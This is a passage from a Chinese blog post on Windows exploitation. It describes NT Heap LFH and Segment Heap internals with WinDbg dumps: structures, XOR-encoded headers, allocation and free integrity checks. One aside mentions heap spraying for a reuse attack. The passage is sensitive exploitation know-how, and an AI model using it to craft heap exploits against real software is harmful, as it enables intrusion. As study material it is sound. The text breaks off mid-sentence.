href="#FrontEndHeap（-LFH-HEAP）" class="headerlink" title="FrontEndHeap（_LFH_HEAP）"></a>FrontEndHeap（_LFH_HEAP）</h5><p>通过 <code>_HEAP</code> 的 <code>FrontEndHeap</code> 成员指针访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">   +0x000 Lock             : _RTL_SRWLOCK</span><br><span class="line">   +0x008 SubSegmentZones  : _LIST_ENTRY</span><br><span class="line">   +0x018 Heap             : Ptr64 Void</span><br><span class="line">   +0x020 NextSegmentInfoArrayAddress : Ptr64 Void</span><br><span class="line">   +0x028 FirstUncommittedAddress : Ptr64 Void</span><br><span class="line">   +0x030 ReservedAddressLimit : Ptr64 Void</span><br><span class="line">   +0x038 SegmentCreate    : Uint4B</span><br><span class="line">   +0x03c SegmentDelete    : Uint4B</span><br><span class="line">   +0x040 MinimumCacheDepth : Uint4B</span><br><span class="line">   +0x044 CacheShiftThreshold : Uint4B</span><br><span class="line">   +0x048 SizeInCache      : Uint8B</span><br><span class="line">   +0x050 RunInfo          : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">   +0x060 UserBlockCache   : [12] _USER_MEMORY_CACHE_ENTRY</span><br><span class="line">   +0x2a0 MemoryPolicies   : _HEAP_LFH_MEM_POLICIES</span><br><span class="line">   +0x2a4 Buckets          : [129] _HEAP_BUCKET</span><br><span class="line">   +0x4a8 SegmentInfoArrays : [129] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +0x8b0 AffinitizedInfoArrays : [129] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +0xcb8 SegmentAllocator : Ptr64 _SEGMENT_HEAP</span><br><span class="line">   +0xcc0 LocalData        : [1] _HEAP_LOCAL_DATA</span><br></pre></td></tr></table></figure><ul><li><code>Heap</code>, 指向其对应的 <code>_HEAP</code>结构体</li><li><code>Buckets</code>, 一个存放129个 <code>_HEAP_BUCKET</code>结构体的数组, 用来寻找配置大小对应到Block大小的阵列结构</li><li><code>SegmentInfoArrays</code>, 一个存放129个 <code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体指针的数组, 不同大小对应到不同的 <code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体, 主要管理对应到的 <code>_HEAP_SUBSEGMENT</code>的信息</li><li><code>LocalData</code>, 一个 <code>_HEAP_LOCAL_DATA</code>结构体</li></ul><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759903256842.png" alt="1759903256842"></p><h5 id="Buckets（-HEAP-BUCKET）"><a href="#Buckets（-HEAP-BUCKET）" class="headerlink" title="Buckets（_HEAP_BUCKET）"></a>Buckets（_HEAP_BUCKET）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_BUCKET</span><br><span class="line">   +0x000 BlockUnits       : Uint2B</span><br><span class="line">   +0x002 SizeIndex        : UChar</span><br><span class="line">   +0x003 UseAffinity      : Pos 0, 1 Bit</span><br><span class="line">   +0x003 DebugFlags       : Pos 1, 2 Bits</span><br><span class="line">   +0x003 Flags            : UChar</span><br></pre></td></tr></table></figure><ul><li><code>BlockUnits</code>, 要分配出去的一个block的大小, 存放 <code>size &gt;&gt; 4</code>，对应SegmentInfoArray中_HEAP_SUBSEGMENT结构体中的BlockSize</li><li><code>SizeIndex</code>, bucket下标 ，<code>SegmentInfoArrays</code> 对应位置的 <code>BucketIndex</code></li></ul><h5 id="UserBlocks（-HEAP-USERDATA-HEADER）"><a href="#UserBlocks（-HEAP-USERDATA-HEADER）" class="headerlink" title="UserBlocks（_HEAP_USERDATA_HEADER）"></a>UserBlocks（_HEAP_USERDATA_HEADER）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0:017&gt; dx -r1 ((ntdll!_HEAP_USERDATA_HEADER *)0x20793447a10)</span><br><span class="line">((ntdll!_HEAP_USERDATA_HEADER *)0x20793447a10)                 : 0x20793447a10 [Type: _HEAP_USERDATA_HEADER *]</span><br><span class="line">    [+0x000] SFreeListEntry   [Type: _SINGLE_LIST_ENTRY]</span><br><span class="line">    [+0x000] SubSegment       : 0x2079341f200 [Type: _HEAP_SUBSEGMENT *]</span><br><span class="line">    [+0x008] Reserved         : 0x20793406330 [Type: void *]</span><br><span class="line">    [+0x010] SizeIndexAndPadding : 0xc [Type: unsigned long]</span><br><span class="line">    [+0x010] SizeIndex        : 0xc [Type: unsigned char]</span><br><span class="line">    [+0x011] GuardPagePresent : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x012] PaddingBytes     : 0x0 [Type: unsigned short]</span><br><span class="line">    [+0x014] Signature        : 0xf0e0d0c0 [Type: unsigned long]</span><br><span class="line">    [+0x018] EncodedOffsets   [Type: _HEAP_USERDATA_OFFSETS]</span><br><span class="line">    [+0x020] BusyBitmap       [Type: _RTL_BITMAP_EX]</span><br><span class="line">    [+0x030] BitmapData       [Type: unsigned __int64 [1]]</span><br></pre></td></tr></table></figure><ul><li><p><code>SubSegment (_HEAP_SUBSEGMENT)</code>：指回对应的 <code>SubSegment</code></p></li><li><p><code>EncodedOffsets</code>：用来验证 chunk header 是否被修改过，由下面 4 个值异或：</p><ul><li><code>RtlpLFHKey</code>：进程创建时初始化的一个 8 字节随机数</li><li><code>UserBlock</code> 的地址</li><li><code>UserBlock</code> 对应的 <code>LowFragHeap</code> 的地址</li><li><code>sizeof(UserBlocks) | ((0x10 * BlockIndex) &lt;&lt; 16)</code></li></ul><p>在释放一个 LFH chunk 时，NT Heap 会通过 <code>UserBlock ^ RtlpLFHKey ^ _SegmentInfoArray-&gt;EncodedOffsets ^ LowFragHeap</code> 计算出 <code>sizeof(UserBlocks) | ((0x10 * BlockIndex) &lt;&lt; 16)</code> 的值，进而计算出 chunk 的地址与要释放的 chunk 的地址进行比较，从而验证 chunk header 是否被修改过。</p></li><li><p><code>BusyBitmap</code>：记录 <code>UserBlock</code> 中在使用的 chunk 的 bitmap</p></li><li><p><code>Block</code>：LFH 返回给使用者的 chunk</p></li></ul><h5 id="HEAP-ENTRY-1"><a href="#HEAP-ENTRY-1" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;</span><br><span class="line">    Uint4B SubSegmentCode;</span><br><span class="line">    Uint2B PreviousSize;</span><br><span class="line">    Uchar SegmentOffset;</span><br><span class="line">    Uchar Unusedbyte;</span><br><span class="line">    Uchar UserData[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>size</code>, <code>Flags</code>和 <code>SmallTagIndex</code>变成了 <code>SubSegmentCode</code></p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759909553929.png" alt="1759909553929"></p><ul><li><p><code>SubSegmentCode</code>：用来计算 <code>UserBlock</code> 的地址，是下面 4 个值的异或(所有 <code>UserBlocks</code>里的chunk header在初始化的时候都会经过xor)：</p><ul><li>chunk 对应的 <code>_HEAP</code> 地址的低 4 字节</li><li><code>RtlpLFHKey</code> 的低 4 字节</li><li>chunk 地址右移 4 bit</li><li>chunk 与其所在的 <code>UserBlock</code> 的距离左移 12 bit <code>((chunk address) - (UserBLocks address)) &lt;&lt; 12</code></li></ul></li><li><p><code>PreviousSize</code>：该 chunk 在 <code>UserBlock</code> 中的 index 左移 8 bit</p></li><li><p><code>SegmentOffset</code>：通常为 0 ，没有用。</p></li><li><p><code>UnusedBytes</code>：在空闲 chunk 中为 0x80，在使用的chunk 中为 <code>UnusedBytes &gt;= 0x3F ? 0xBF : (UnusedBytes | 0x80)</code></p></li></ul><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在 <code>FrontEndHeapUsageData[x] &amp; 0x1F &gt; 0x10</code>时, 置位 <code>_HEAP-&gt;CompatibilityFlag |= 0x20000000</code>, 下一次allocate(也就是第18次)就会启用LFH并初始化</p><p>分配机制还是有些复杂了，交给AI简化一下</p><p>第 18 次 malloc：</p><ul><li><p><code>_HEAP-&gt;BlocksIndex</code> 是一个管理不同尺寸范围的 <code>_HEAP_LIST_LOOKUP</code> 结构体链表。默认只管理小尺寸 chunk (e.g., <code>&lt; 0x800</code>)。为了支持 LFH，系统会 <strong>扩展此链表</strong> ，追加新的节点以管理更大的尺寸范围（e.g., <code>0x800</code> 到 <code>0x4000</code>）。</p></li><li><p>针对当前被激活的尺寸 <code>x</code>，系统会初始化其对应的 Bucket。具体动作是在 <code>_LFH_HEAP-&gt;SegmentInfoArrays</code> 数组中，填入一个指向 <code>_HEAP_LOCAL_SEGMENT_INFO</code> 结构体的指针。这个结构体是该特定尺寸的“分配管理器”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> 0:000&gt; dt _LFH_HEAP 0x2bacb070000</span><br><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">   +0x000 Lock             : _RTL_SRWLOCK</span><br><span class="line">   +0x008 SubSegmentZones  : _LIST_ENTRY [ 0x000002ba`cb105e30 - 0x000002ba`cb105e30 ]</span><br><span class="line">   +0x018 Heap             : 0x000002ba`cb100000 Void</span><br><span class="line">   +0x020 NextSegmentInfoArrayAddress : 0x000002ba`cb071080 Void</span><br><span class="line">   +0x028 FirstUncommittedAddress : 0x000002ba`cb072000 Void</span><br><span class="line">   +0x030 ReservedAddressLimit : 0x000002ba`cb0d2000 Void</span><br><span class="line">   +0x038 SegmentCreate    : 3</span><br><span class="line">   +0x03c SegmentDelete    : 0</span><br><span class="line">   +0x040 MinimumCacheDepth : 0</span><br><span class="line">   +0x044 CacheShiftThreshold : 0</span><br><span class="line">   +0x048 SizeInCache      : 0</span><br><span class="line">   +0x050 RunInfo          : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">   +0x060 UserBlockCache   : [12] _USER_MEMORY_CACHE_ENTRY</span><br><span class="line">   +0x2a0 MemoryPolicies   : _HEAP_LFH_MEM_POLICIES</span><br><span class="line">   +0x2a4 Buckets          : [129] _HEAP_BUCKET</span><br><span class="line">   +0x4a8 SegmentInfoArrays : [129] (null) </span><br><span class="line">   +0x8b0 AffinitizedInfoArrays : [129] (null) </span><br><span class="line">   +0xcb8 SegmentAllocator : (null) </span><br><span class="line">   +0xcc0 LocalData        : [1] _HEAP_LOCAL_DATA</span><br><span class="line">0:000&gt; dx -r1 (*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x2bacb0704a8))</span><br><span class="line">(*((ntdll!_HEAP_LOCAL_SEGMENT_INFO * (*)[129])0x2bacb0704a8))                 [Type: _HEAP_LOCAL_SEGMENT_INFO * [129]]</span><br><span class="line">    ....</span><br><span class="line">    [15]             : 0x2bacb070fc0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]   0xF &lt;--0xF0（不包含头部）大小的堆块</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure></li><li><p><code>RtlpActivateLowFragmentationHeap</code>调用 <code>RtlpCreateLowFragHeap</code> 创建一个 <code>_LFH_HEAP</code> 结构，并将其地址存入 <code>_heap-&gt;FrontEndHeap</code>只用NT heap的话这个地方是不存在的</p></li><li><p>调用 <code>RtlpExtend...</code> 系列函数</p></li><li><p><strong>由于前面创建结构会申请一些堆块，所以造成了第 18 次开始 chunk 申请不连续的假象。</strong></p></li></ul><p>第 19 次 malloc开始分配</p><h4 id="分配-Allocation"><a href="#分配-Allocation" class="headerlink" title="分配 (Allocation)"></a>分配 (Allocation)</h4><p><img src="/image/2025-10-7-learning_windows_pwn_2/1759917256615.png" alt="1759917256615"></p><p>分配的核心逻辑在 <code>RtlpLowFragHeapAllocFromContext</code> 函数中，分为<strong>寻找可用 Subsegment</strong> 和<strong>从中获取 chunk</strong> 两步。</p><ol><li><strong>寻找可用的 Subsegment (内存池)</strong><ul><li><p>首先，检查当前尺寸的“首选”内存池 <code>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</code> 中是否还有空闲块。通过检查 <code>ActiveSubsegment-&gt;AggregateExchg.Depth</code>（空闲块数量）来判断。 –&gt;reuse attack可以通过这里查看需要堆喷射多少堆块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dx -r1 ((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x2bacb070fc0)</span><br><span class="line">((ntdll!_HEAP_LOCAL_SEGMENT_INFO *)0x2bacb070fc0)                 : 0x2bacb070fc0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]</span><br><span class="line">    [+0x000] LocalData        : 0x2bacb070cc0 [Type: _HEAP_LOCAL_DATA *]</span><br><span class="line">    [+0x008] ActiveSubsegment : 0x2bacb105ed0 [Type: _HEAP_SUBSEGMENT *]</span><br><span class="line">    [+0x010] CachedItems      [Type: _HEAP_SUBSEGMENT * [16]]</span><br><span class="line">    [+0x090] SListHeader      [Type: _SLIST_HEADER]</span><br><span class="line">    [+0x0a0] Counters         [Type: _HEAP_BUCKET_COUNTERS]</span><br><span class="line">    [+0x0a8] LastOpSequence   : 0x3 [Type: unsigned long]</span><br><span class="line">    [+0x0ac] BucketIndex      : 0xf [Type: unsigned short]</span><br><span class="line">    [+0x0ae] LastUsed         : 0x0 [Type: unsigned short]</span><br><span class="line">    [+0x0b0] NoThrashCount    : 0x2 [Type: unsigned short]</span><br><span class="line">0:000&gt; dx -r1 ((ntdll!_HEAP_SUBSEGMENT *)0x2bacb105ed0)</span><br><span class="line">((ntdll!_HEAP_SUBSEGMENT *)0x2bacb105ed0)                 : 0x2bacb105ed0 [Type: _HEAP_SUBSEGMENT *]</span><br><span class="line">    [+0x000] LocalInfo        : 0x2bacb070fc0 [Type: _HEAP_LOCAL_SEGMENT_INFO *]</span><br><span class="line">    [+0x008] UserBlocks       : 0x2bacb10a240 [Type: _HEAP_USERDATA_HEADER *]</span><br><span class="line">    [+0x010] DelayFreeList    [Type: _SLIST_HEADER]</span><br><span class="line">    [+0x020] AggregateExchg   [Type: _INTERLOCK_SEQ]</span><br><span class="line">    [+0x024] BlockSize        : 0x10 [Type: unsigned short]</span><br><span class="line">    [+0x026] Flags            : 0x0 [Type: unsigned short]</span><br><span class="line">    [+0x028] BlockCount       : 0x3f [Type: unsigned short]</span><br><span class="line">    [+0x02a] SizeIndex        : 0xf [Type: unsigned char]</span><br><span class="line">    [+0x02b] AffinityIndex    : 0x0 [Type: unsigned char]</span><br><span class="line">    [+0x024] Alignment        [Type: unsigned long [2]]</span><br><span class="line">    [+0x02c] Lock             : 0x7 [Type: unsigned long]</span><br><span class="line">    [+0x030] SFreeListEntry   [Type: _SINGLE_LIST_ENTRY]</span><br><span class="line">0:000&gt; dx -r1 (*((ntdll!_HEAP_SUBSEGMENT *)0x2bacb105ed0)).AggregateExchg</span><br><span class="line">(*((ntdll!_HEAP_SUBSEGMENT *)0x2bacb105ed0)).AggregateExchg                 [Type: _INTERLOCK_SEQ]</span><br><span class="line">    [+0x000] Depth            : 0x5 [Type: unsigned short]  </span><br><span class="line">    [+0x002 (14: 0)] Hint             : 0x3 [Type: unsigned short]</span><br><span class="line">    [+0x002 (15:15)] Lock             : 0x0 [Type: unsigned short]</span><br><span class="line">    [+0x002] Hint16           : 0x3 [Type: unsigned short]</span><br><span class="line">    [+0x000] Exchg            : 196613 [Type: long]</span><br></pre></td></tr></table></figure></li><li><p>如果 <code>ActiveSubsegment</code> 已满，则去“备用池” <code>CachedItems</code> 列表里寻找其他有空闲块的 <code>Subsegment</code>。如果找到，就将其设置为新的 <code>ActiveSubsegment</code>。</p></li><li><p>如果所有现有 <code>Subsegment</code> 都满了，则会 <strong>分配并初始化一个新的 <code>UserBlocks</code></strong> （即 <code>_HEAP_SUBSEGMENT</code>），并将其设置为 <code>ActiveSubsegment</code>。</p></li></ul></li><li><strong>从 Subsegment 中获取 Chunk</strong><ul><li><strong>获取随机数</strong> : 从一个全局的 256 元素随机数数组 <code>RtlpLowFragHeapRandomData</code> 中循环取值。这个随机数（范围 0x0 ~ 0x7F）用于增加分配地址的不可预测性。</li><li><strong>计算随机起始索引</strong> : 使用公式 <code>index = (random_value * max_index) &gt;&gt; 7</code> 计算出一个在 <code>UserBlocks</code> 内的随机起始搜索点。</li><li><strong>查找空闲块 (位图操作)</strong> : 从计算出的 <code>index</code> 开始，扫描 <code>UserBlocks-&gt;BusyBitmap</code>。</li><li>如果 <code>index</code> 对应的位是 <code>0</code>（空闲），则直接选中。</li><li>如果该位是 <code>1</code>（占用，即发生碰撞&#x2F;collision），则向后线性搜索，直到找到第一个为 <code>0</code> 的位。</li><li><strong>更新元数据</strong> :</li><li>将 <code>BusyBitmap</code> 中找到的位设置为 <code>1</code>。</li><li>更新 <code>ActiveSubsegment-&gt;AggregateExchg.Depth</code> 等统计信息。</li><li>在返回的 chunk 头部进行设置：<ul><li><code>chunk-&gt;PreviousSize</code> 被用来存储这个 chunk 在 <code>UserBlocks</code> 中的索引，便于释放时快速定位。</li><li><code>chunk-&gt;UnusedBytes</code> 的最高位被设置为 <code>1</code>（<code>|= 0x80</code>），标记这是一个由 LFH 分配的、处于“占用”状态的 chunk。</li></ul></li><li><strong>返回地址</strong> : 最后，将 chunk 的用户数据区地址返回给调用者。</li></ul></li></ol><h4 id="释放-Free"><a href="#释放-Free" class="headerlink" title="释放 (Free)"></a>释放 (Free)</h4><ul><li>在 <code>RtlpFreeHeapInternal</code> 函数中首先会检查释放的内存地址是否对齐 0x10 。</li><li>通过 <code>_HEAP_ENTRY-&gt;UnpackedEntry.UnusedBytes &amp; 0x3F</code> 是否为 0 判断 chunk 是否已被释放。</li><li>通过 <code>_HEAP_ENTRY-&gt;UnpackedEntry.SubSegmentCode</code> 找到对应的 <code>UserBlock</code> 进而找到 <code>HeapSubsegment</code> 。</li><li>通过 <code>UserBlock-&gt;EncodedOffsets</code> 再尝试找回 <code>_HEAP_ENTRY</code> 从而校验有无恶意修改。</li><li>将 <code>_HEAP_ENTRY.UnusedBytes</code> 设置为 0x80 。</li><li>将 <code>UserBlocks-&gt;BusyBitmap.Buffer</code> 中释放的 chunk 对应的位复位。</li></ul><h2 id="Segment-Heap"><a href="#Segment-Heap" class="headerlink" title="Segment Heap"></a>Segment Heap</h2><p>segment heap分配规则：</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764555740216.png" alt="1764555740216"></p><p>在常规的应用进程中，Windows使用Nt Heap，而在特定进程，例如lsass.exe,svchost.exe等系统进程中，Windows采用Segment Heap</p><p>Windows在系统进程中使用Segment Heap，部分应用也使用了Segment heap，比如Edge。对于特定的进程开启Segment Heap，需要在注册表里修改：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TestSegmentHeap.exe&quot;</span> /v FrontEndHeapDebugOptions /t REG_DWORD /d <span class="number">0</span>x8 /f</span><br></pre></td></tr></table></figure><h3 id="VS-堆"><a href="#VS-堆" class="headerlink" title="VS 堆"></a>VS 堆</h3><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764555139767.png" alt="1764555139767"></p><h4 id="相关结构体-2"><a href="#相关结构体-2" class="headerlink" title="相关结构体"></a>相关结构体</h4><h5 id="Segment-Heap-1"><a href="#Segment-Heap-1" class="headerlink" title="_Segment_Heap"></a>_Segment_Heap</h5><p><code>Signature</code>：区分堆类型的签名，对于 Segment Heap 总是 0xDDEEDDEE 。</p><p><code>SegContexts (_HEAP_SEG_CONTEXT)</code>：与 Segment 有关的管理结构体。</p><p><code>VsContext (_HEAP_VS_CONTEXT)</code>：Variable Size Allocation 的核心结构体，跟踪 variable size allocation 分配状态。</p><p><code>LfhContext ( _HEAP_LFH_CONTEXT)</code>：Low Fragmentation Heap 的核心结构体，跟踪 LFH 分配状态。</p><h5 id="HEAP-VS-CONTEXT"><a href="#HEAP-VS-CONTEXT" class="headerlink" title="_HEAP_VS_CONTEXT"></a>_HEAP_VS_CONTEXT</h5><p><code>FreeChunkTree (_RTL_RB_TREE)</code>：以红黑树管理空闲 chunk ，以chunk 大小维护，较大的 chunk 在右，较小的 chunk 在左。</p><p><code>Root</code>：指向红黑树的根节点。</p><ul><li><code>Encoded</code>：根据最低比特是否为 1 决定红黑树的指针是否加密（默认不加密）。加密方法是当前节点的指针异或当前节点的地址，对于 <code>Root</code> 为 <code>EncodedRoot = Root ^ FreeChunkTree</code></li></ul><p><code>SubsegmentList</code>：所有的 VS Subsegment 链表，实际存储的是 <code>SubsegmentList</code> 地址异或指向的 VS Subsegment 的地址。</p><p><code>DelayFreeContext (_HEAP_VS_DELAY_FREE_CONTEXT)</code>：<code>VsContext-&gt;Config</code> 决定是否开启（用户态默认不开启，内核态默认开启），当开启时释放的 chunk 会先放到 <code>DelayFreeContext</code> 这个单向链表中，当链表中的 chunk 达到一定数量的时候才会集中释放。</p><p><code>BackendCtx</code>：指向  <code>_SEGMENT_HEAP.SegContexts</code> 。这个指针异或了 <code>_HEAP_VS_CONTEXT</code> 的地址。</p><p><code>Callbacks</code>：用于管理 VS SubSegments 函数指针集合，函数指针都经过加密 <code>RtlpHpHeapGlobals.HeapKey ^ VsContext_addr ^ func_ptr</code> 。</p><ul><li><code>Allocate</code>：<code>RtlpHpSegVsAllocate</code></li><li><code>Free</code>：<code>RtlpHpSegLfhVsFree</code></li><li><code>Commit</code>：<code>RtlpHpSegLfhVsCommit</code></li><li><code>Decommit</code>：<code>RtlpHpSegLfhVsDecommit</code></li></ul><h5 id="RtlpHpHeapGlobals（-RTLP-HP-HEAP-GLOBALS）"><a href="#RtlpHpHeapGlobals（-RTLP-HP-HEAP-GLOBALS）" class="headerlink" title="RtlpHpHeapGlobals（_RTLP_HP_HEAP_GLOBALS）"></a>RtlpHpHeapGlobals（_RTLP_HP_HEAP_GLOBALS）</h5><p>在 Segment Heap 中，许多数据和指针都被加密了。<code>RtlpHpHeapGlobals</code> 用于存放加密用的一些 key 和其他信息。地址可以在windbg中使用 <code>dx ntdll!RtlpHpHeapGlobals</code>直接查找，该地址在 <code>ntdll.dll</code>中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _RTLP_HP_HEAP_GLOBALS 0x7fffa3936f40</span><br><span class="line">ntdll!_RTLP_HP_HEAP_GLOBALS</span><br><span class="line">   +0x000 HeapKey          : 0x08a75e35`7d23470b</span><br><span class="line">   +0x008 LfhKey           : 0x2107b942`fbbdfd6a</span><br><span class="line">   +0x010 FailureInfo      : 0x00007fff`a39338b0 _HEAP_FAILURE_INFORMATION</span><br><span class="line">   +0x018 CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +0x038 Flags            : 3</span><br><span class="line">   +0x038 FlagsBits        : &lt;unnamed-tag&gt;</span><br></pre></td></tr></table></figure><ul><li><code>HeapKey</code>：8 字节随机数，用于 VS Allocator 和 Segment Allocator 中的数据加密。</li><li><code>LfhKey</code>：8 字节随机数，用于 LowFragmentationHeap 中的数据加密。</li></ul><h5 id="Allocated-Freed-Chunk"><a href="#Allocated-Freed-Chunk" class="headerlink" title="Allocated &#x2F; Freed Chunk"></a>Allocated &#x2F; Freed Chunk</h5><p><strong>空闲堆块</strong>： <code>FreeChunkTree</code> 中的chunk，头部占八字节，这 8 字节是用 <strong>XOR</strong> 编码的（_HEAP_VS_CHUNK_FREE_HEADER）</p><p>$$<br>\text{DecodedHeader} &#x3D; \text{EncodedHeader} \oplus \text{Address} \oplus \text{HeapKey}<br>$$</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764567797067.png" alt="1764567797067"></p><p><code>MemoryCost</code>：表示 chunk 被申请的时候会有多少 page 被提交</p><p><code>UnsafeSize</code>：堆块 <code>Size</code> ，右移 4 位</p><p><code>UnsafePrevSize</code>：前一个堆块 <code>Size</code> ，右移 4 位。</p><p><code>Allocated</code>：表示堆块是否空闲，已分配恒为 0x1</p><p><strong>已分配的堆块</strong>：HEAP_VS__SUBSEGMENT 中的chunk，头部占16字节（_HEAP_VS_CHUNK_HEADER）</p><p><img src="/image/2025-10-7-learning_windows_pwn_2/1764568101375.png" alt="1764568101375"></p><p><code>EncodedSegmentPageOffset</code>：让堆管理器能够从任意一个 VS 堆块（Chunk）快速反向定位到管理这片内存区域的元数据头部（_HEAP_VS_SUBSEGMENT）。加密： <code>EncodedSegmentPageOffset = SegmentPageOffset ^ (int8)chunk address ^ (int8)RtlpHpHeapGlobals.HeapKey</code></p><h4 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h4><ol><li>大小 <code>&lt;= 0x4000 - 16</code>，尝试走 LFH 机制。<ul><li>如果 LFH 桶已激活，直接分配。</li><li>如果未激活，增加热度计数器，达到阈值才激活，然后依照VS分配。</li></ul></li><li>如果大小 <code>&gt; 0x20000</code>，直接走大块分配接口。</li><li>VS分配：通过 <code>((Size + 0xf) &gt;&gt; 4) + 1</code> 计算出 <code>ChunkIndex</code> 。红黑树 <code>VSContext-&gt;FreeChunkTree</code> 中搜索大于 <code>ChunkIndex</code> 的最小的 chunk 。</li><li>找到后调会用 <code>RtlpHpVsChunkSplit</code> 将 chunk 从红黑树中取出并切掉多余的 chunk ，然后将多余的 chunk 插入到 <code>VSContext-&gt;FreeChunkTree</code><ul><li>切割前会验证所属的 <code>VSSubsegment</code>的 <code>(VSSubsegment-&gt;Signature ^ VSSubsegment-&gt;Size ^ 0x2BED) &amp; 0x7FFF == 0</code></li></ul></li><li>如果找不到合适的 chunk 会调用 <code>RtlpHpVsSubsegmentCreate</code> 函数使用 Segment Allocation 分配一个新的 <code>VSSubsegment</code><ul><li>检查 <code>VSContext-&gt;SubsegmentList.Blink.Flink = VSContext-&gt;SubsegmentList</code> ，如果检查通过则将新创建的 <code>VSSubsegment</code> 从 <code>SubsegmentList.Blink</code> 插入到 <code>SubsegmentList</code> 链表中</li><li>将新申请的 <code>VSSubsegment</code> 中的 chunk 插入到 <code>VSContext-&gt;FreeChunkTree</code> 中然后重新在红黑树中搜索合适的 chunk</li></ul></li></ol><h4 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h4><p>对于当前block的校验</p><ol><li>如果 <code>BlockPtr</code> 最低 16 比特（0xFFFF）为 0 则判定为 Large Block 堆分配。（因为Large Block通常是按 64KB 对齐的）</li><li>通过 <code>ChunkHeader.Allocated</code> 判断 chunk 是否已被释放来防止 double free</li><li>解密 <code>ChunkHeader.EncodedSegmentPageOffset</code>，通过 <code>SegmentPageOffset</code> 找到 <code>VSSubsegment</code> 并校验这个 <code>VSSubsegment</code> 的 <code>Signature</code>（VSSubsegment-&gt;Signature ^ VSSubsegment-&gt;Size ^ 0x2BED) &amp; 0x7FFF &#x3D;&#x3D;0）</li><li>调用 <code>RtlpHpVsChunkCoalesce</code> 函数来合并<ol><li>更新 chunk 的 